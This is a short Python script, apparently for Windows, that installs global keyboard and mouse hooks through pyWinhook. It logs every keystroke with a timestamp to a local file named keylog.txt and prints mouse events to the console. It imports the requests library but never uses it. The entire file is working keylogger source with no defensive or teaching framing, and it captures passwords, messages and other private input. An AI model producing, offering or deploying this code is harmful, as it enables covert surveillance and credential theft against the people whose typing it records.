import os
import logging
import requests
from datetime import datetime

import pythoncom
import pyWinhook as hook
import win32gui


# Configure the logger
LOG_KEYSTROKES = os.path.join(os.getcwd(), 'keylog.txt')
logging.basicConfig(filename=LOG_KEYSTROKES, level=logging.DEBUG, format='%(asctime)s: %(message)s')


# Mouse event listener
def on_mouse_click(event):
    
    # Log mouse event
    print('Mouse event:', event.MessageName, event.Position)
        
    return True

# Keyboard even listener
def on_keyboard_event(event):
    
    logging.info('Key: %s' % chr(event.Ascii))

    return True

# Create the hook manager and register the event handler
hm = hook.HookManager()
hm.KeyDown = on_keyboard_event
hm.MouseAll = on_mouse_click
hm.HookKeyboard()
hm.HookMouse()

# Start the event loop
pythoncom.PumpMessages()